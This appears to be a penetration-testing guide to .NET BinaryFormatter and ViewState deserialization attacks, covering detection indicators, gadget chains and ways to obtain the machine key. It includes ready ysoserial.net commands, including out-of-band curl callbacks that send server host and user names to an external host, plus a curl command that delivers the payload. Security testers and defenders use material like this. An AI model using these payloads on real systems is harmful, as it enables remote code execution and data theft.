# .NET BinaryFormatter / LosFormatter Deserialization

## Purpose

Test .NET applications that deserialize attacker-controlled data with `BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`, `SoapFormatter`, or `ObjectStateFormatter`, enabling full RCE through ysoserial.net gadget chains on any .NET Framework version.

## Applicability

- ASP.NET WebForms (`.aspx`) — ViewState, `__VIEWSTATE` hidden field
- WCF services accepting binary-encoded messages
- Custom session stores or remoting endpoints using `BinaryFormatter`
- Applications with `.NET` in tech stack and opaque binary/base64 parameters
- ASMX web services, .NET Remoting endpoints

## Preconditions

- User-controlled data reaches `BinaryFormatter.Deserialize()`, `LosFormatter.Deserialize()`, or equivalent
- **ViewState path**: MAC (`EnableViewStateMac`) is disabled, OR machine key is known/weak/discoverable
- Serialization filter (`SerializationBinder`) absent or insufficient
- Target is .NET Framework (not .NET 5+, where `BinaryFormatter` throws `NotSupportedException` by default unless overridden)

## Relevant Architecture

**Direct deserialization**
```
User input (base64 / HTTP body / WCF binary)
    → Convert.FromBase64String / BinaryReader
    → BinaryFormatter.Deserialize(stream)
    → object graph reconstruction
    → IDeserializationCallback.OnDeserialization / surrogates
    → gadget chain → Process.Start / Assembly.Load / file write
```

**ViewState path**
```
HTTP POST: __VIEWSTATE=<base64>
    → MAC verification (HMAC-SHA1 using MachineKey)
        ├─ MAC disabled → no check → proceed
        └─ MAC enabled, key unknown → blocked (unless key obtained)
    → LosFormatter.Deserialize / ObjectStateFormatter.Deserialize
    → BinaryFormatter internally → RCE
```

## Technical Knowledge

**Format detection**
- `BinaryFormatter` binary: starts with bytes `00 01 00 00 00 ff ff ff ff` (or similar preamble)
- Base64 of `BinaryFormatter` output often starts with `AAEAAAD/////`
- ViewState: base64-encoded, MAC appended — ViewState decoded starts with object state header

**ysoserial.net gadget chains**

| Formatter | Chain | Notes |
|-----------|-------|-------|
| `BinaryFormatter` | `TypeConfuseDelegate`, `TextFormattingRunProperties`, `ActivitySurrogateSelector` | Most reliable |
| `BinaryFormatter` | `WindowsPrincipal`, `SessionSecurityToken` | Requires specific .NET versions |
| `LosFormatter` | Same as BinaryFormatter (wraps it) | Used in ViewState |
| `SoapFormatter` | `TypeConfuseDelegate` | Less common |
| `NetDataContractSerializer` | `TypeConfuseDelegate` | WCF paths |
| `ObjectStateFormatter` | `BinaryFormatter`-based chains | ASP.NET page state |

**ysoserial.net basic usage**
```powershell
# Generate BinaryFormatter payload
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"

# Generate ViewState payload (MAC disabled)
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"

# Generate ViewState with known MachineKey
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
  --validationalg="SHA1" --validationkey="<hex-key>" --generator="<generator-id>" \
  --viewstateuserkey="<user-key-if-set>" --isdebug --islegacy
```

**Machine key discovery**
- `web.config` leaked via path traversal, `.bak` files, or misconfigured server
- Default machine keys in known ASP.NET versions (not truly default but predictable in some hosting environments)
- Error pages disclosing machine key (verbose error mode)
- `machineKey` element: `<machineKey validationKey="..." decryptionKey="..." validation="SHA1" />`

**.NET 5+ status**
- `BinaryFormatter.Deserialize` throws `NotSupportedException` in .NET 5+ unless `AppContext.SetSwitch("System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", true)`
- Still relevant in .NET Framework 4.x (EOL extended support), Mono, Unity

## Indicators

**Black-box (ViewState)**
- `__VIEWSTATE` hidden field present in HTML form
- `EnableViewStateMac` = `false` visible in page source or deducible from missing `__VIEWSTATEMACDID` field
- Error: `This is an invalid webresource request` (often MAC check fail on tampered state)
- Error: `The state information is invalid for this page and might be corrupted` (tampered ViewState)

**Black-box (general)**
- Parameter/cookie contains base64 starting with `AAEAAAD/////`
- WCF endpoint accepting `application/soap+msbin1` or `application/x-microsoft-net-remoting-leakage`
- Error stack trace mentioning `BinaryFormatter`, `ObjectInputStream` (.NET), `TypeLoadException`

**White-box**
```csharp
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);           // sink

LosFormatter los = new LosFormatter();
object state = los.Deserialize(viewStateString);      // ViewState sink

NetDataContractSerializer ndcs = new NetDataContractSerializer();
ndcs.Deserialize(stream);                             // WCF sink
```

## Interpretation

1. **`__VIEWSTATE` with no MAC fields** → `EnableViewStateMac=false`; directly injectable with LosFormatter chain
2. **`InvalidCastException` or `SerializationException` on tampered base64** → BinaryFormatter sink confirmed
3. **`CryptographicException: Padding is invalid`** on ViewState → MAC enabled with unknown key; need key disclosure
4. **WCF service with WSDL and binary binding** → NetDataContractSerializer path possible; probe with malformed binary
5. **OOB callback / command output** → RCE confirmed

## Security-Relevant Conditions

- **`EnableViewStateMac=false`**: Critical; LosFormatter chain injectable with no key material
- **Known machine key**: ViewState chain injectable even with MAC enabled
- **Custom `SerializationBinder`** with insufficient allowlist: May block TypeConfuseDelegate; try alternate chain
- **Old .NET Framework (< 4.5)**: More chains available; fewer binding restrictions
- **IIS with `customErrors mode="Off"`**: Stack traces leak class names and machine key path hints

## Experiment Considerations

- For ViewState: check `EnableViewStateMac` first by modifying `__VIEWSTATE` value — if no error, MAC is off
- Use OOB HTTP callback command in payload: `cmd /c curl http://<oast>` — confirms blind RCE without relying on response
- ysoserial.net requires Windows / .NET to run — if sandbox is Linux, generate payloads on a Windows VM or use precomputed base64 payloads
- `TypeConfuseDelegate` chain is the most broadly applicable; fallback to `TextFormattingRunProperties` if it fails
- Obtain `generator` and `viewstateuserkey` from page source for ViewState payloads with known machine key

## Evidence Expectations

1. Tampered `__VIEWSTATE` (or base64 parameter) sends ysoserial.net payload
2. OOB HTTP/DNS callback received → execution on server confirmed
3. Optionally exfiltrate `whoami` / `hostname` via curl OOB
4. Document: `__VIEWSTATE` / parameter name, whether MAC was disabled or key was obtained, chain name, .NET Framework version (from `X-Powered-By` or error pages), ysoserial.net command used

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `This is an invalid webresource request` | ViewState MAC check failed; MAC is enabled and key needed |
| `SerializationException: End of Stream encountered` | Payload format wrong; regenerate with correct formatter flag |
| `TypeLoadException: Could not load type` | Chain class not available in target .NET version; try alternate chain |
| `NotSupportedException: BinaryFormatter serialization` | Target is .NET 5+ with BinaryFormatter disabled; pivot to Json.NET or other sink |
| No OOB callback from `cmd /c curl` | Egress filtered; try DNS (`nslookup`) or timing (`ping -n 10 127.0.0.1`) |

## False Positives

- `__VIEWSTATE` present but `EnableViewStateMac=true` with strong unknown machine key — protected unless key is obtained
- BinaryFormatter called only for internal serialization between trusted services (verify input data path from user)
- Custom `SerializationBinder` enforces a strict allowlist of safe types — verify the allowlist exhaustively

## Limitations

- ysoserial.net requires .NET / Windows environment to generate payloads — Linux sandbox needs pregenerated payloads
- `.NET 5+` BinaryFormatter disabled by default — verify target runtime version before testing
- Machine key brute-force is generally infeasible for modern keys; key disclosure is required
- Some chains are .NET version-specific (e.g., `SessionSecurityToken` requires certain assemblies)

## Related Knowledge

- `dotnet-jsonnet` — when the .NET sink is Json.NET `TypeNameHandling` rather than BinaryFormatter
- `signed-state` — when the blob has HMAC/MAC protection requiring key material
- ASP.NET ViewState security: `EnableViewStateMac` and `ViewStateEncryptionMode` controls
- ysoserial.net documentation: gadget chain prerequisites by .NET version

## Tooling

```powershell
# Windows — generate BinaryFormatter payload (OOB curl)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 `
  -c "cmd /c curl http://<oast>/?x=%COMPUTERNAME%"

# ViewState — MAC disabled
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -o base64 `
  -c "cmd /c curl http://<oast>/?x=%USERNAME%"

# ViewState — with known MachineKey
ysoserial.exe -p ViewState -g TypeConfuseDelegate `
  -c "cmd /c curl http://<oast>/?x=%COMPUTERNAME%" `
  --validationalg="SHA1" `
  --validationkey="<paste-hex-key-here>" `
  --generator="<4-hex-chars-from-page-source>"
```

```bash
# Linux sandbox — use pregenerated base64 payload or generate on Windows VM
# Send ViewState payload via curl
curl -s -X POST https://target/page.aspx \
  -d "__VIEWSTATE=<base64-payload>&__EVENTVALIDATION=...&__VIEWSTATEGENERATOR=..."
```